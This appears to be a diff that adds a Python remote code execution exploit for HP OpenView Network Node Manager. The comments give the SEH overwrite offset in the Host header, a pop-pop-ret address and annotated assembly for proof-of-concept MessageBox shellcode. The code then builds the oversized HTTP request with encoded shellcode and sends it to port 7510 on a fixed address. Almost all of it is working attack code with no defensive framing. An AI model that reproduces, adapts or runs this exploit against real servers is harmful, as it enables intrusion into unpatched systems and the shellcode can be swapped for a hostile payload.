@@ -1,0 +1,43 @@
+#HP Openview Network Node Manager remote code exploit
+
+#using spike fuzzer and o ollydbg, the SEH overwrite was found to be 3381 
+#bytes into the buffer placed in the Host parameter on a request to /topology/home
+#A pop-pop-ret address of 5a010f34 was found to use in this position.  
+#The pop-pop-ret places the EIP four bytes before the overwrite, where I place a JNO instruction to place EIP at 1035fe3d,
+#just after the overwrite. 
+
+#The shellcode for message box requires parameters to be in a certain order on the stack, before making the system call.  
+#The assembly instructions for this shellcode is shown below:
+
+#035FFBC   68 20202000      PUSH 202020	//push ‘pwned’ for caption
+#1035FFC1   68 70776E64      PUSH 646E7770	//continue pushing ‘pwned’
+#1035FFC6   8BDC             MOV EBX,ESP		//put a pointer to the caption in ebx
+#1035FFC8   68 20202000      PUSH 202020	//push ‘pwned’ for message text
+#1035FFCD   68 70776E64      PUSH 646E7770	//continue pushing ‘pwned’
+#1035FFD2   8BCC             MOV ECX,ESP		//put a pointer to the text in ecx
+#1035FFD4   8BCC             MOV ECX,ESP		//looks like this is in here twice, but the code still works
+#1035FFD6   33C0             XOR EAX,EAX		//zero out eax
+#1035FFD8   50               PUSH EAX		//push eax for first parameter for message box
+#1035FFD9   53               PUSH EBX		//push caption for the next parameter
+#1035FFDA   51               PUSH ECX		//push text for the next parameter
+#1035FFDB   50               PUSH EAX		//push eax for last parameter for message box
+#1035FFDC   50               PUSH EAX		//align stack for correct offset in message box call
+#1035FFDD   BE DED83B77      MOV ESI,USER32.MessageBoxA //put MessageBoxA address in esi
+#1035FFE2   FFE6             JMP ESI			//jump to message box
+
+#!/usr/bin/python
+import socket
+import os
+import sys
+stuff="\x2d\x4d\x4d\x4d\x4d\x2d\x4d\x4d\x4d\x4d\x2d\x6a\x47\x64\x65\x50\x5c\x57\x58\x2d\x32\x32\x32\x32\x2d\x32\x4d\x75\x75\x2d\x61\x09\x59\x71\x50\x57\x58\x2d\x5b\x5b\x5b\x5b\x2d\x52\x77\x5b\x5b\x2d\x03\x6f\x6a\x70\x50\x57\x58\x2d\x3c\x70\x70\x3c\x2d\x74\x3c\x3e\x73\x50\x57\x58\x2d\x6e\x02\x63\x39\x2d\x07\x31\x69\x06\x50\x57\x58\x2d\x3d\x45\x05\x02\x2d\x55\x56\x6f\x31\x50\x57\x58\x2d\x6f\x45\x45\x45\x2d\x45\x50\x45\x3c\x2d\x4c\x02\x05\x07\x50\x57\x58\x2d\x42\x69\x69\x69\x2d\x56\x76\x76\x76\x50\x57\x58\x2d\x3b\x65\x65\x65\x2d\x05\x05\x06\x65\x2d\x52\x31\x09\x59\x50\x57\x58\x2d\x34\x34\x34\x34\x2d\x76\x31\x06\x06\x2d\x56\x32\x55\x4e\x50\x57\x58\x2d\x66\x78\x78\x78\x2d\x32\x67\x67\x67\x50"
+crash = "A"*3377 + "\x71\x07\x43\x43\x34\x0f\x01\x5a" + "CC"+"\x54\x58"+stuff+"C"*439
+buffer="GET /topology/homeBaseView HTTP/1.1\r\n"
+buffer+="Host: " + crash + "\r\n"
+buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
+buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
+buffer+="Content-Length: 1048580\r\n\r\n"
+print "[*] Sending evil HTTP request to NNMz"
+expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+expl.connect(("192.168.27.240", 7510))
+expl.send(buffer)
+expl.close()
